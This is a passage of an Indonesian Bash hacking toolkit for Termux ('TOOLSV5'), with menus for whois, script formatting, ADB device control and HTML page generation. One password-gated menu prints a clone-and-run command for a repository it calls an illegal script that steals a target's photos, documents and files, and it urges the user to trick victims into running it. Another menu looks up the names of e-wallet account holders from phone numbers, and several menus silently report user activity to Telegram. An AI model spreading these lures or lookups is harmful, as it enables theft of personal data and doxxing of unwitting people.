                                                                                                         exit 1
                                                                                                  fi
                                                                                                  if ! command -v whois &> /dev/null; then
                                                                                                         echo "whois tidak ditemukan, menginstal whois..."
                                                                                                         $paket install whois -y
                                                                                                  fi
                                                                                                  clear
                                                                                                  hasil() {
                                                                                                         echo "======================================================"
                                                                                                         echo " WHOIS Info untuk: $domain"
                                                                                                         echo "======================================================"
                                                                                                  }
                                                                                                  hasil | lolcat
                                                                                                  whois $domain | awk '
/^Domain Name:/ {print "\nDomain Name: "$0}
/^Registrar:/ {print "\nRegistrar: "$0}
/^Updated Date:/ {print "\nUpdated Date: "$0}
/^Creation Date:/ {print "\nCreation Date: "$0}
/^Registry Expiry Date:/ {print "\nExpiry Date: "$0}
/^Name Server:/ {print "\nName Servers: "$0}
/^Registrant Name:/ {print "\nRegistrant: "$0}
/^Registrant Organization:/ {print "Registrant Organization: "$0}
/^Registrant Country:/ {print "Registrant Country: "$0}
/^Registrar Abuse Contact Email:/ {print "\nAbuse Contact: "$0}
/^Registrar Abuse Contact Phone:/ {print "Abuse Contact Phone: "$0}'
                                                                                                  echo "======================================================"
                                                                                                  read -p "Apa Anda ingin mengulangi (y/n)? " apa
                                                                                                  if [ "$apa" != "y" ]; then
                                                                                                         echo "Terima kasih!"
                                                                                                         exit 0
                                                                                                  fi
                                                                                           done
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $h "Package Belum Terinstall"
                                                                                           $paket install -y whois
                                                                                    fi
                                                                             done
                                                                             read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
                                                                      elif [ "$no" = "down33" ]; then
                                                                             while true; do
                                                                                    redhawk="$DIR_SAVE/RED_HAWK"
                                                                                    if [ -d "$redhawk" ]; then
                                                                                           e $h "Anda Sudah Menginstall...❗"
                                                                                           sleep 3
                                                                                           clear
                                                                                           cd $redhawk
                                                                                           php rhawk.php
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $m "Installasi Package...❗"
                                                                                           $paket install -y php nmap
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/Tuhinshubhra/RED_HAWK
                                                                                    fi
                                                                             done
                                                                             read -p "ENTER UNTUK MENGULANG KE TOOLSV5"
                                                                      elif [ "$no" = "34" ]; then
                                                                             check_shfmt() {
                                                                                    if ! command -v shfmt &> /dev/null; then
                                                                                           echo "shfmt not found, installing..."
                                                                                           nala update
                                                                                           $paket install -y shfmt &> /dev/null | echo "Bentar Brek Instalasi Package Sabar Ya"
                                                                                    fi
                                                                             }
                                                                             while true; do
                                                                                    check_shfmt
                                                                                    clear
                                                                                    play -q "$HOME/Lubeban/sound/robot.mp3" &> /dev/null &
                                                                                    $banner | lolcat
                                                                                    e "$b"
                                                                                    sleep 3
                                                                                    play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
                                                                                    e " Masukkan jalur dan nama script yang ingin Ditata\n Contohnya :$bg_h /sdcard/nama_file_mu$res"
                                                                                    sleep 3
                                                                                    e "$m"
                                                                                    play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                    read -p " Silahkan Masukkan Jalur Dan Nama Script : " jalurdanscript
                                                                                    play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                    read -p " Berapa Baris ? Default ( 5 ) : " baris
                                                                                    play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                    e "$k"
                                                                                    clear
                                                                                    if [ -f "$jalurdanscript" ]; then
                                                                                           text=" Galirus Sedang Menformat skrip Anda Di Jalur : $jalurdanscript "
                                                                                           delay=0.05
                                                                                           for ((i = 0; i < ${#text}; i++)); do
                                                                                                  echo -n "${text:i:1}"
                                                                                                  sleep $delay
                                                                                           done
                                                                                           e "$h"
                                                                                           play -q "$HOME/Lubeban/sound/loading.mp3" &> /dev/null &
                                                                                           sleep 2
                                                                                           function show_loading() {
                                                                                                  local i=0
                                                                                                  while [ $i -le 100 ]; do
                                                                                                         printf '\r%s' " ==> Proses [ $i ]"
                                                                                                         sleep 0.05
                                                                                                         ((i++))
                                                                                                  done
                                                                                           }
                                                                                           show_loading &
                                                                                           sleep 8
                                                                                           shfmt -w -i $baris -ci -sr "$jalurdanscript"
                                                                                           kill $! &> /dev/null &
                                                                                           e "$k"
                                                                                           clear
                                                                                           play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                           text="Skrip telah diformat Jalur Hasil : $jalurdanscript"
                                                                                           delay=0.05
                                                                                           for ((i = 0; i < ${#text}; i++)); do
                                                                                                  echo -n "${text:i:1}"
                                                                                                  sleep $delay
                                                                                           done
                                                                                           sleep 2
                                                                                    else
                                                                                           clear
                                                                                           play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
                                                                                           e $bg_m " File $jalurdanscript tidak ditemukan$res"
                                                                                           sleep 5
                                                                                    fi
                                                                                    e "$h"
                                                                                    play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                    read -p "Apakah Anda ingin mengulangi proses? (y/n): " galirus
                                                                                    play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
                                                                                    if [[ $galirus != "y" ]]; then
                                                                                           break
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "35" ]; then
                                                                             cek_akses
                                                                             GALERI_EYES() {
                                                                                    clear
                                                                                    text="      SHIROKO TOOLS GALERI EYES $versitoolsv5"
                                                                                    delay=0.05
                                                                                    for ((i = 0; i < ${#text}; i++)); do
                                                                                           echo -n "${text:i:1}"
                                                                                           sleep $delay
                                                                                    done
                                                                                    sleep 5
                                                                                    while true; do
                                                                                           clear
                                                                                           $banner | lolcat
                                                                                           e $bg_m "1.SHIROKO GALERY EYES PAYLOADNYA SCRIPT$res"
                                                                                           e $bg_m "2.HASIL PANCINGAN KUNJUNG I TELEGRAM SHIROKO$res"
                                                                                           e $bg_m "0.BACK TO TOOLSV5$res"
                                                                                           read -p "Silahkan Pilih : " mana
                                                                                           if [ "$mana" = "1" ]; then
                                                                                                  clear
                                                                                                  isipesan="Terdeteksi Mengakses Menu 1 ( SCRIPT PAYLOAD ) 👨‍💻"
                                                                                                  telegram &> /dev/null &
                                                                                                  bannerteks() {
                                                                                                         echo "
Script Ilegal yang Digunakan untuk Mengambil Data Pribadi Target
Jenis data yang diambil:
- FOTO
- TXT
- PDF
- ZIP
- SCRIPT BASH
- SCRIPT PYTHON
Anda bisa memancing target untuk menggunakan command di bawah ini dan membujuk target untuk menggunakannya:
Command:
pkg update
pkg install jq -y
pkg install curl -y
pkg install w3m -y
pkg install yarn nodejs -y
git clone https://github.com/GALIRUS404/REPORT-WA
cd REPORT-WA
bash gas.sh
Harap diperhatikan bahwa penggunaan script ilegal dapat melanggar hukum dan etika."
                                                                                                  }
                                                                                                  sleep 3
                                                                                                  bannerteks | lolcat
                                                                                                  echo
                                                                                                  e "$m"
                                                                                                  read -p "ENTER UNTUK MENGULANG KE MENU"
                                                                                           elif [ "$mana" = "2" ]; then
                                                                                                  xdg-open "https://t.me/+QQyJf6UqwY8zN2U1"
                                                                                           elif [ "$mana" = "0" ]; then
                                                                                                  break
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             isipesan="Terdeteksi MASUK KE SHIROKO EYES  💻"
                                                                             telegram &> /dev/null &
                                                                             while true; do
                                                                                    clear
                                                                                    read -p "Password : " apa
                                                                                    if [ "$apa" = "G1912" ]; then
                                                                                           GALERI_EYES
                                                                                           break
                                                                                    else
                                                                                           clear
                                                                                           e "$bld Password Yang Anda Masukkan Salah Silahkan Tanya Ke Admin"
                                                                                           sleep 3
                                                                                           break
                                                                                    fi
                                                                             done
                                                                             e "$h"
                                                                      elif [ "$no" = "36" ]; then
                                                                             ADB_DEBUGGING() {
                                                                                    gal="adb"
                                                                                    clear
                                                                                    $paket install -y sox
                                                                                    $paket install -y android-tools
                                                                                    clear
                                                                                    e $q $b "Installing Success"
                                                                                    sleep 3
                                                                                    clear
                                                                                    play -q welcome.mp3 &> /dev/null &
                                                                                    while true; do
                                                                                           cek-ADB() {
                                                                                                  output=$(adb devices)
                                                                                                  if echo "$output" | grep -q "device$"; then
                                                                                                         e $h "Perangkat terhubung ke ADB DEBUGGING$res"
                                                                                                  else
                                                                                                         e $m "Tidak ada perangkat yang terhubung.$res"
                                                                                                  fi
                                                                                           }
                                                                                           cekcok=$(cek-ADB)
                                                                                           banner() {
                                                                                                  e $q $b"======================================================"
                                                                                                  e $q $m
                                                                                                  e $q " █████╗ ██████╗ ██████╗ "
                                                                                                  e $q "██╔══██╗██╔══██╗██╔══██╗"
                                                                                                  e $q "███████║██║  ██║██████╦╝$p"
                                                                                                  e $q "██╔══██║██║  ██║██╔══██╗"
                                                                                                  e $q "██║  ██║██████╔╝██████╦╝"
                                                                                                  e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h Galirus"
                                                                                                  e $q $b"======================================================"
                                                                                                  e $k "Status: $cekcok"
                                                                                           }
                                                                                           clear
                                                                                           banner
                                                                                           $e
                                                                                           $e
                                                                                           e $q $b "[$k 1$b ]$p ADB CONNECT PAIRING CODE"
                                                                                           e $q $b "[$k 2$b ]$p ADB CONNECT PORT"
                                                                                           e $q $b "[$k 3$b ]$p ADB MENU"
                                                                                           e $q $b "[$k 0$b ]$p EXIT$m"
                                                                                           read -p " Choose (0-3) : " pil
                                                                                           case $pil in
                                                                                                  1)
                                                                                                         clear
                                                                                                         banner
                                                                                                         e $q "$p Please login$b"
                                                                                                         read -p "Ip Address : " ip
                                                                                                         read -p "Port : " port
                                                                                                         read -p "Code : " code
                                                                                                         adb pair $ip:$port $code
                                                                                                         echo "Successs Silahkan Masuk Ke Menu 2"
                                                                                                         sleep 5
                                                                                                         ;;
                                                                                                  2)
                                                                                                         clear
                                                                                                         banner
                                                                                                         read -p "Ip Address : " mana
                                                                                                         read -p "Port connecting : " apa
                                                                                                         adb connect $mana:$apa
                                                                                                         sleep 3
                                                                                                         clear
                                                                                                         banner
                                                                                                         adb devices
                                                                                                         echo
                                                                                                         echo
                                                                                                         sleep 3
                                                                                                         read -p "ENTER untuk masuk ke menu"
                                                                                                         sleep 3
                                                                                                         ;;
                                                                                                  3)
                                                                                                         clear
                                                                                                         banner
                                                                                                         e $q $b "[$k 1$b ]$p SINGNAL 9 ( NETHUNTER )"
                                                                                                         e $q $b "[$k 2$b ]$p NONAKTIFKAN APK"
                                                                                                         e $q $b "[$k 3$b ]$p PEMULIHAN APK"
                                                                                                         e $q $b "[$k 4$b ]$p HAPUS DATA APK ( WARNING )"
                                                                                                         e $q $b "[$k 0$b ]$p EXIT$m"
                                                                                                         read -p " Choose (0-4) : " pi
                                                                                                         case $pi in
                                                                                                                1)
                                                                                                                       e $q $k "You chose option 1"
                                                                                                                       sleep 2
                                                                                                                       e $q $k "Starting Signal 9 configuration"
                                                                                                                       sleep 3
                                                                                                                       adb shell "/system/bin/device_config set_sync_disabled_for_tests persistent"
                                                                                                                       adb shell "/system/bin/device_config put activity_manager max_phantom_processes 2147483647"
                                                                                                                       adb shell settings put global settings_enable_monitor_phantom_procs false
                                                                                                                       result=$(adb shell "/system/bin/device_config get activity_manager max_phantom_processes")
                                                                                                                       if [ "$result" == "2147483647" ]; then
                                                                                                                              e $q $h "Signal 9 configuration applied successfully!"
                                                                                                                              read -p "Silahkan ENTER untuk Kembali"
                                                                                                                       else
                                                                                                                              e $q $m "Signal 9 configuration failed!"
                                                                                                                              read -p "Silahkan ENTER untuk Kembali"
                                                                                                                       fi
                                                                                                                       ;;
                                                                                                                2)
                                                                                                                       clear
                                                                                                                       banner
                                                                                                                       adb shell pm list packages
                                                                                                                       $e
                                                                                                                       read -p "Apk Mana Yang Ingin Anda Nonaktifkan Dari Hp : " oposu
                                                                                                                       adb shell pm uninstall --user 0 $oposu
                                                                                                                       clear
                                                                                                                       banner
                                                                                                                       e $h "Success ! Silahkan Cek Di Home Device Anda !$m"
                                                                                                                       read -p "Silahkan ENTER untuk Masuk Ke Menu"
                                                                                                                       ;;
                                                                                                                3)
                                                                                                                       clear
                                                                                                                       banner
                                                                                                                       read -p "Masukkan Package Yang Ingin Anda Kembalikan : " opo
                                                                                                                       adb shell cmd package install-existing $opo
                                                                                                                       e $h "Silahkan Anda Cek Di Home Device "
                                                                                                                       sleep 3
                                                                                                                       read -p " ENTER untuk Kembali Ke Menu"
                                                                                                                       ;;
                                                                                                                4)
                                                                                                                       e="\e"
                                                                                                                       bg_h="\e[48;5;82m"
                                                                                                                       bg_m="\e[48;5;88m"
                                                                                                                       bg_k="\e[48;5;88m"
                                                                                                                       bg_b="\e[48;5;24m"
                                                                                                                       m="\e[1m"
                                                                                                                       res="\e[0m"
                                                                                                                       clear
                                                                                                                       banner
                                                                                                                       e $bg_h "Menampilkan daftar paket yang terpasang di perangkat...$res"
                                                                                                                       adb shell pm list packages
                                                                                                                       e $bg_m "Masukkan nama paket aplikasi yang ingin dihapus cache-nya (satu per satu).$res"
                                                                                                                       e $bg_k "Setelah selesai, ketik 'n' untuk berhenti dan melanjutkan.$res"
                                                                                                                       e $m "Contoh: com.example.app1$res"
                                                                                                                       e $bg_h "Masukkan nama paket aplikasi:"
                                                                                                                       > list.txt
                                                                                                                       while true; do
                                                                                                                              read -p "Masukkan nama paket aplikasi: " package
                                                                                                                              if [ -n "$package" ]; then
                                                                                                                                     echo "$package" >> list.txt
                                                                                                                                     e $bg_h "Paket $package telah ditambahkan ke list.$res"
                                                                                                                              fi
                                                                                                                              read -p "Apakah Anda ingin menambahkan paket lain? (Y/n): " yn
                                                                                                                              if [[ ! $yn =~ ^[Yy]$ ]]; then
                                                                                                                                     break
                                                                                                                              fi
                                                                                                                       done
                                                                                                                       e $bg_b "Menghapus cache untuk aplikasi yang terdaftar dalam list.txt...$res"
                                                                                                                       while read package; do
                                                                                                                              if [ -n "$package" ]; then
                                                                                                                                     echo "Menghapus cache untuk aplikasi: $package"
                                                                                                                                     adb shell pm clear $package
                                                                                                                              fi
                                                                                                                       done < list.txt
                                                                                                                       e $bg_h "Cache untuk aplikasi yang terdaftar telah berhasil dihapus.$res"
                                                                                                                       read -p "ENTER untuk kembali ke Menu"
                                                                                                                       ;;
                                                                                                                0)
                                                                                                                       e $q $k "You Choose Exit"
                                                                                                                       sleep 1
                                                                                                                       e $q $h "Subscribe my Channel"
                                                                                                                       termux-open "https://www.youtube.com/@GalirusProjects"
                                                                                                                       sleep 2
                                                                                                                       break
                                                                                                                       ;;
                                                                                                                *) e $q $m "Input Failed" ;;
                                                                                                         esac
                                                                                                         ;;
                                                                                                  0)
                                                                                                         e $q $k "You Choose Exit"
                                                                                                         sleep 1
                                                                                                         e $q $h "Subscribe my Channel"
                                                                                                         termux-open "https://www.youtube.com/@GalirusProjects"
                                                                                                         sleep 2
                                                                                                         break
                                                                                                         ;;
                                                                                                  *) e $q $m "Input Failed" ;;
                                                                                           esac
                                                                                    done
                                                                             }
                                                                             ADB_DEBUGGING
                                                                      elif [ "$no" = "37" ]; then
                                                                             cek_akses
                                                                             blacklist() {
                                                                                    local nomor_input="$1"
                                                                                    local nomor_blacklist="085850268349"
                                                                                    if [[ "$nomor_input" == "$nomor_blacklist" ]]; then
                                                                                           echo "Nomor $nomor_input diblokir (blacklist)."
                                                                                           return 1
                                                                                    else
                                                                                           echo "Nomor $nomor_input tidak ada dalam blacklist."
                                                                                           return 0
                                                                                    fi
                                                                             }

                                                                             osint_name_pake_nomor() {
                                                                                    ACCOUNT_NUMBER="$nomor"
                                                                                    BANKS=("ovo" "dana" "linkaja" "gopay" "shopeepay")
                                                                                    spinner() {
                                                                                           local pid=$1
                                                                                           local delay=0.1
                                                                                           local spinstr='|/-\'
                                                                                           while kill -0 "$pid" 2> /dev/null; do
                                                                                                  for i in $(seq 0 3); do
                                                                                                         printf "\r${ran4}%s${ran7} Loading..." "${spinstr:i:1}"
                                                                                                         sleep $delay
                                                                                                  done
                                                                                           done
                                                                                           printf "\r"
                                                                                    }
                                                                                    output=""
                                                                                    for BANK in "${BANKS[@]}"; do
                                                                                           output+="${ran3}Checking account for $BANK${ran7}\n"
                                                                                           TMPFILE=$(mktemp)
                                                                                           curl -s -X POST "https://cekrekening-api.belibayar.online/api/v1/account-inquiry" \
                                                                                                  -H "Content-Type: application/json" \
                                                                                                  -d "{\"account_bank\": \"$BANK\", \"account_number\": \"$ACCOUNT_NUMBER\"}" > "$TMPFILE" 2>&1 &
                                                                                           curl_pid=$!
                                                                                           spinner "$curl_pid"
                                                                                           wait "$curl_pid"
                                                                                           RESPONSE=$(cat "$TMPFILE")
                                                                                           rm -f "$TMPFILE"
                                                                                           if echo "$RESPONSE" | jq empty 2> /dev/null; then
                                                                                                  SUCCESS=$(echo "$RESPONSE" | jq -r '.success')
                                                                                                  MESSAGE=$(echo "$RESPONSE" | jq -r '.message')
                                                                                                  ACCOUNT_HOLDER=$(echo "$RESPONSE" | jq -r '.data.account_holder')
                                                                                                  output+="${ran2}Status       : $MESSAGE${ran7}\n"
                                                                                                  if [[ -n $ACCOUNT_HOLDER && $ACCOUNT_HOLDER != "null" && $ACCOUNT_HOLDER != "" ]]; then
                                                                                                         output+="${ran2}Nama Akun    : $ACCOUNT_HOLDER${ran7}\n"
                                                                                                  else
                                                                                                         output+="${ran2}Nama Akun    : (tidak tersedia)${ran7}\n"
                                                                                                  fi
                                                                                           else
                                                                                                  output+="${ran1}[Error] Response bukan JSON valid:${ran7}\n$RESPONSE\n"
                                                                                           fi
                                                                                           output+="-----------------------------------------\n"
                                                                                    done
                                                                                    max_length=0
                                                                                    while IFS= read -r line; do
                                                                                           clean_line=$(echo -e "$line" | sed 's/\x1b\[[0-9;]*m//g')
                                                                                           len=${#clean_line}
                                                                                           ((len > max_length)) && max_length=$len
                                                                                    done <<< "$(echo -e "$output")"
                                                                                    max_length=$((max_length + 2))
                                                                                    echo -e "┌$(printf '─%.0s' $(seq 1 $max_length))┐"
                                                                                    while IFS= read -r line; do
                                                                                           clean_line=$(echo -e "$line" | sed 's/\x1b\[[0-9;]*m//g')
                                                                                           padding=$((max_length - ${#clean_line} - 1))
                                                                                           printf "│ %b%*s│\n" "$line" "$padding" ""
                                                                                    done <<< "$(echo -e "$output")"
                                                                                    echo -e "└$(printf '─%.0s' $(seq 1 $max_length))┘"
                                                                             }
                                                                             banner_osint() {
                                                                                    echo "
     ⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀  ⠀⠀[ TOOLSV5 ]⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇ DEVELOPMENT GALIRUS OFFICIAL
l0===[]================> OSINT EWALLET & NAME⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                                             }
                                                                             banner() {
                                                                                    banner_osint | lolcat
                                                                                    e "$m Ketik EXIT jika mau keluar$ran8"
                                                                             }
                                                                             while true; do
                                                                                    clear
                                                                                    banner
                                                                                    read -p "Masukkan Nomor 08xxx: " nomor
                                                                                    if [[ "$nomor" = "exit" || "$nomor" = "EXIT" ]]; then
                                                                                           break 2
                                                                                    fi
                                                                                    if blacklist "$nomor"; then
                                                                                           osint_name_pake_nomor
                                                                                    else
                                                                                           echo "Proses dihentikan karena nomor diblokir."
                                                                                    fi
                                                                                    echo " Silahkan Enter Untuk Kembali Ke Menu"
                                                                                    read
                                                                             done
                                                                      elif [ "$no" = "38" ]; then
                                                                             banner() {
                                                                                    echo "
██████╗██████╗ ███████╗ █████╗ ████████╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝
██║     ██████╔╝█████╗  ███████║   ██║   █████╗
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗
╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ html
AUTHOR    : GALIRUS OFFICIAL
WEBSITE   : https://www.ppprogresif.com/galirus-official
DEVELOPER : TOOLSV5 X GALIRUS OFFICIAL
"
                                                                             }
                                                                             menu() {
                                                                                    echo -e " menu : "
                                                                                    echo -e " 1.Galirus Html (1) "
                                                                                    echo -e " 2.Galirus Html (2) "
                                                                                    echo -e " 0. BACK TO TOOLSV5 "
                                                                                    echo
                                                                             }
                                                                             GALIRUS_OFFICIAL() {
                                                                                    read -p "Masukkan link url (background belakang): " url_background
                                                                                    read -p "Masukkan Nama Author: " Author
                                                                                    read -p "Masukkan link url ( logo ): " logo
                                                                                    read -p "Masukkan Quotes Teks Mu (sad / apa lah): " qoutes
                                                                                    read -p "Masukkan Url music (tidak support yt): " url_music
                                                                                    output_file="/storage/emulated/0/HASIL_HTML_GALIRUS_OFFICIAL.html"
                                                                                    cat << EOF > "$output_file"
<!DOCTYPE html>
<html lang="en">
<head>
<meta property="og:title" content="GalirusProjects">
<link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
<meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache">
<meta name="keywords" content="GalirusProjects">
<meta charset="utf-8"
<title>Galirus Official</title>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
<style type="text/css">
html {
background-image: url($url_background);
background-position: center;
background-size: cover;
background-attachment: fixed;
color: #fff;
text-align: center;
font-family: "Kelly Slab", sans-serif;
margin: 0;
font-weight: 60;
height: 60vh;
transition: background-image 1s ease-in-out;
}
body, font, .button-like, .footer-greetings marquee {
text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
}
.button-like {
display: inline-block;
padding: 15px 25px;
background-color: #3498db;
color: #ffffff;
font-size: 2.2em;
border: 2px solid #2980b9;
border-radius: 15px;
margin: 10px;
text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
}
.fade-img {
width: 700px;
opacity: 1;
animation: fadeEffect 5s infinite alternate;
}
@keyframes fadeEffect {
0% { opacity: 0.2; }
100% { opacity: 1; }
}
</style>
</head>
<body>
<div id="homePage">
<br>
<font size="3" color="white">Author By : </font><font size="6" color="red">$Author</font><br><br><br>
<i><br>
<img title="GalirusProjects" src="$logo" class="fade-img"><br>
<font size="10" color="red">Hello Saya $Author</font><br><br>
<hr>
<div id="typing-effect" style="font-size: 1.5em; color: white; font-weight: bold; padding: 20px;"></div>
<script>
const text = "$qoutes";
let index = 0;
function typeWriter() {
if (index < text.length) {
document.getElementById("typing-effect").innerHTML += text.charAt(index);
index++;
setTimeout(typeWriter, 100);
}
}
typeWriter();
</script>
<a href="#" onclick="showStore(); return false;" class="button-like">TOOLSV5</a>
<a href="https://wa.me/p/8709692955788033/6285850268349" class="button-like">BUY</a>
<a href="https://bc683363-58f1-458c-94d0-27201448688a-00-3mgocbzgj74ut.sisko.replit.dev/chat" class="button-like">ROOM CHAT</a>
</i>
<br><hr><br>
<div class="footer-greetings">
<marquee><font size="4" color="red"><b>THANK YOU FOR</b>: </font><font size="5" color="white">ALLAH X GALIRUS OFFICIAL X TOOLSV5</font></marquee>
</div>
<hr><br>
<audio controls autoplay loop src="$url_music"></audio>
</div>
</body>
</html>
EOF
                                                                                    clear
                                                                                    echo "File HTML berhasil dibuat di: $output_file"
                                                                                    read -p "Silahkan ENTER untuk masuk ke menu"
                                                                             }
                                                                             LAIN() {
                                                                                    read -p "Masukkan link url (background belakang): " url_background
                                                                                    read -p "Masukkan Nama Author: " Author
                                                                                    read -p "Masukkan link url ( logo ): " logo
                                                                                    read -p "Masukkan Quotes Teks Mu (sad / apa lah): " qoutes
                                                                                    read -p "Masukkan Url ( yt channel mu ) :" url_yt
                                                                                    read -p "Masukkan Url ( akun Tiktok mu ) :" url_tiktok
                                                                                    read -p "Masukkan Url ( grup WhatsApp ) :" url_Grup
                                                                                    read -p "Nama Grup ( yang akan di tampilkan ) : " nama_grup
                                                                                    read -p "Pesan Untuk di sebelah ( THANKS YOU FOR ): " apa
                                                                                    read -p "Masukkan Url music (tidak support yt): " url_music
                                                                                    output_file="/storage/emulated/0/HASIL_HTML_GALIRUS_OFFICIAL(2).html"
                                                                                    cat << EOF > "$output_file"
<html>
<head>
<meta property="og:title" content="GalirusProjects">
<link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
<meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache">
<meta name="keywords" content="GalirusProjects">
<meta charset="utf-8">
<title>Galirus Official</title>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
<script src="" type="text/javascript"></script>
<script src="" type="text/javascript"></script>
<script src="" type="text/javascript"></script>
</head>
<body>
<style type="text/css">
html {
background-image: url($url_background );
background-repeat: no-repeat;
background-position: center;
background-size: cover;
background-attachment: fixed;
height: auto;
width: auto;
background-color: #ffffff;
color: #fff;
text-align: center;
font-family: "Kelly Slab", sans serif;
margin: 0;
font-weight: 60;
height: 60vh;
}
.button-like {
display: inline-block;
padding: 10px 20px;
background-color: #3498db; /* Warna latar belakang */
color: #ffffff; /* Warna teks */
border: 2px solid #2980b9; /* Warna border */
border-radius: 15px;
}
</style>
<br>
<embed src="https://youtu.be/AnMhdn0wJ4I&autoplay=1&start=0" type="application/x-shockwave-flash" wmode="transparent" width="0" height="0"></embed>
</div>
</body>
</html>
<br><br>
<font size="3" color="white">Author By : </font><font size="6" color="red">$Author</font><br><br><br>
<img title="GalirusProjects" src="$logo" width="400"><br>
<i><br>
<font size="7" color="red">Hello Saya $Author</font><br><hr><br>
<font size="5" color="white">$qoutes</font><br><hr><br>
<font size="3" color="yellow"></font><br><hr>
<a href="$url_yt"><div size="20" class="button-like">YouTube</div></a>
<a href="$url_tiktok"><div size="20" class="button-like">Tiktok</div></a><br><br>
<a href="https://fnofzyyubhbh7sdbgzzjva.on.drv.tw/galirus/script.html"><div size="20" class="button-like">Script Termux</div></a>
<a href="$url_Grup"><div size="10" class="button-like">$nama_grup</div></a>
<br>
<br>
<hr><div size="10" class="footer-greetings"><marquee><font size="4" color="red">
<b>THANKS YOU FOR  </b> : </font><font size="5" color="white">$apa</font></font></marquee></div></td></table>
<hr><br>
<audio controls="controls" autoplay="true" loop="loop" src="$url_music"></audio>
</i>
<script>
